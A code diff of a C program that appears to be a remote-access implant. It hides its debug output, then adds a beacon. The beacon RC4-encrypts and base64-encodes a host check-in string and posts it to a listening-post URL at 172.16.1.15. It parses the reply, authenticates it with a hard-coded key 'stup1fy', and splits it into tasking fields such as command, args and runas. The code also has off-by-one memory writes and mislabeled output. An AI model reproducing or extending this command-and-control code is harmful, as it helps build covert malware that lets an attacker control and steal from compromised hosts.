@@ -29,9 +29,9 @@ void get_mac_address(int socketHandle){
     if (ioctl(socketHandle, SIOCGIFHWADDR, &s) == 0) {
         int i;
         for (i = 0; i < 6; ++i){
-            printf("%02x:", (unsigned char) s.ifr_addr.sa_data[i]);
+            //printf("%02x:", (unsigned char) s.ifr_addr.sa_data[i]);
         }
-	puts("\n");
+//	puts("\n");
     }
 
 }
@@ -216,25 +216,190 @@ char *rc4(char *str, const char *key){
 
     return a;
 }
-int main(int argc, char *argv[]){
-    const char *key = "ZAQwsxcde321";
-    char *t = rc4("test",key);
-    printf("%s\n",rc4(t,key));
-    size_t x;
-    printf("%s\n",base64_encode(t,strlen(t),&x));
 
+/* the function to invoke as the data recieved */
+size_t static write_callback_func(void *buffer,
+                        size_t size,
+                        size_t nmemb,
+                        void *userp)
+{
+    char **response_ptr =  (char**)userp;
+
+    /* assuming the response is a string */
+    *response_ptr = strndup(buffer, (size_t)(size *nmemb));
+    return size *nmemb;
+
+}
+
+int main(int argc, char *argv[]){
+    int i = 0;
+  
+    const wchar_t GOODCHAR = '~';
+    const wchar_t BADCHAR = '+';
+    const char *key = "ZAQwsxcde321";
+    // Get our RC4 encoded string
+    char *z = rc4("enc=123spec!alk3y456&hn=D&num=172.16.1.15&id=3&pp=0&vn=0.1&cb=-1",key);
+    size_t x;
+    // Get size of our string base64 encoded
+    char *base = base64_encode(z,strlen(z),&x);
+    for (i = 0; i < strlen(base); i++){
+        if(base[i] == BADCHAR){
+            base[i] = GOODCHAR;
+        }
+    }
+    // Allocate space for our final data +3 for "pd="
+    char *to = (char*) malloc(x+3);
+    strncpy(to,"pd=",3);
+    strncat(to, base, x);
+    char *response = NULL;
     CURL *curl;
     CURLcode res;
     curl = curl_easy_init();
     if(curl){
-           curl_easy_setopt(curl,CURLOPT_URL,"http://172.16.1.15/ThrowbackLP/");
-           curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");
+            curl_easy_setopt(curl,CURLOPT_URL,"http://172.16.1.15/ThrowbackLP/");
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, to);
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback_func);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
     }
+    
     res = curl_easy_perform(curl);
     if(res != CURLE_OK){
         fprintf(stderr, "curl_easy_perform() failed %s\n",curl_easy_strerror(res));
     }
     curl_easy_cleanup(curl);
+    
+    
+    // Identify the last newline which should be 
+    int stringStart = 0;
+    for (i = strlen(response); i > 0 ; i--){
+        if(response[i] == '\n'){
+            stringStart = i+1;  
+            break;
+        }
+    }
+    // get the substring for the last line
+    unsigned int size = (strlen(response) - stringStart);
+    char *command = (char*) malloc(size);
+    memcpy(command, &response[stringStart], size );
+    command[size] = '\0';
+    int spaces[3];
+    int counter = 0;
+    int parseCommand = 0;
+    // Get first split in string
+    for (i = 0; i < strlen(command); i++){
+        if(command[i] == ' '){
+            spaces[counter] = i;
+            // Make sure we don't overflow our buffer only allow 3 spaces to be recorded
+            if(counter < (sizeof(spaces)/sizeof(spaces[0]))-1 ){
+                counter++;
+            }else{
+                break;
+            }
+        }
+    }
+    // Get the key to verify it is a legit user
+    size = (spaces[1]-spaces[0]);
+    char *k = (char*)malloc(size);
+    memcpy(k, &command[spaces[0]+1], size-1 );
+    k[size] = '\0';
+    if( strcmp(k,"stup1fy") == 0) {
+        parseCommand = 1;
+    }
+    // Free up our allocated space   
+    free(k);
+    free(to);
+    
+    if(parseCommand == 1){
+        // Get the command
+        size = spaces[2]-spaces[1];
+        char *com = (char*)malloc(size);
+        memcpy(com, &command[spaces[1]+1], size-1 );
+        com[size] = '\0';
+        unsigned int comSep[6] = { 0, 0, 0, 0, 0, 0 };
+
+        counter = 0;
+        for(i =  0; i < strlen(com); i++){
+            if(com[i] == '&'){     
+                if(counter < 7){
+                    comSep[counter] = i;
+                }else{
+                    break;
+                }
+                counter++;
+            }
+            
+        }
+
+        int success = 1;
+        // Check if we've parsed all our commands out
+        for(i =0; i < (sizeof(comSep)/sizeof(comSep[0])); i++){
+            if(comSep[i] == 0){
+                success = 0;              
+            }                        
+        }
+
+        // if we were able to parse our command spaces
+        if(success == 1){
+            // Allocate our space for data
+            char *todo = (char*)malloc(comSep[0]+1);
+            //printf("%d-",comSep[0]+1);
+            char *pk = (char*)malloc(comSep[1] - comSep[0]);
+            //printf("%d-",(comSep[1] - comSep[0]));
+            char *command = (char*)malloc(comSep[2] - comSep[1]);
+            //printf("%d-",(comSep[2] - comSep[1]));
+            char *args = (char*)malloc(comSep[3] - comSep[2]);
+           // printf("%d-",comSep[3] - comSep[2]);
+            char *runas = (char*)malloc(comSep[4] - comSep[3]);
+            //printf("%d-",(comSep[4] - comSep[3]));
+            char *reserved1 = (char*)malloc(comSep[5] - comSep[4]);
+            //printf("%d-",(comSep[5] - comSep[4]));
+            char *reserved2 = (char*)malloc(strlen(com) - comSep[5]);
+            //printf("%d-",(strlen(com) - comSep[5]));
+            
+            // Copy the data in
+            memcpy(todo, &com[0], comSep[0] );
+            todo[comSep[0]] = '\0';
+            printf("%s\n",todo);
+
+            memcpy(pk, &com[comSep[0]]+1, (comSep[1] - comSep[0])-1 );
+            pk[(comSep[1] - comSep[0])-1] = '\0';
+            printf("%s\n",pk);
+
+            memcpy(command, &com[comSep[1]]+1, (comSep[2] - comSep[1])-1 );
+            command[(comSep[2] - comSep[1])-1] = '\0';
+            printf("%s\n",command);
+
+            memcpy(args, &com[comSep[2]]+1, (comSep[3] - comSep[2])-1 );
+            args[(comSep[3] - comSep[2])-1] = '\0';
+            printf("%s\n",args);
+
+            memcpy(runas, &com[comSep[3]]+1, (comSep[4] - comSep[3])-1 );
+            runas[(comSep[4] - comSep[3])-1] = '\0';
+            printf("%s\n",args);
+
+            memcpy(reserved1, &com[comSep[4]]+1, (comSep[5] - comSep[4])-1 );
+            reserved1[(comSep[5] - comSep[4])-1] = '\0';
+            printf("%s\n",reserved1);
+            
+            memcpy(reserved2, &com[comSep[5]]+1, (strlen(com) - comSep[5])-1 );
+            reserved2[(strlen(com) - comSep[5])-1] = '\0';
+            printf("%s",reserved2);
+            
+         }
+        // We've processed out our command time to free it
+        free(com);
+
+        //int todonum = atoi(todo);
+
+       // if(todonum == 5){
+
+    
+    }
+    // We've returned from the area where we've been using our orig command
+    free(command);
+
+ 
+
     
 
     char hostname[HOST_NAME_MAX];
@@ -249,7 +414,7 @@ int main(int argc, char *argv[]){
         fprintf(stderr, "%s: gethostname(2)\n",strerror(errno));
         exit(1);
     }
-    printf("host name = '%s'\n", hostname);
+    //printf("host name = '%s'\n", hostname);
     
     char *internetIP = getPrimaryIP();
 
@@ -269,7 +434,7 @@ int main(int argc, char *argv[]){
 	    char addressBuffer[INET_ADDRSTRLEN];
  	    inet_ntop(AF_INET,tmpAddrPtr,addressBuffer,INET_ADDRSTRLEN);
 	    if(strcmp (internetIP,addressBuffer) == 0){
-		    printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
+		    //printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer);
 	    }
         }
     }
@@ -281,5 +446,5 @@ int main(int argc, char *argv[]){
    	fprintf(stderr, "Unable to set locale\n");
 	exit(EX_OSERR);
     }
-    printf("Hello World");
+   // printf("Hello World");
 }
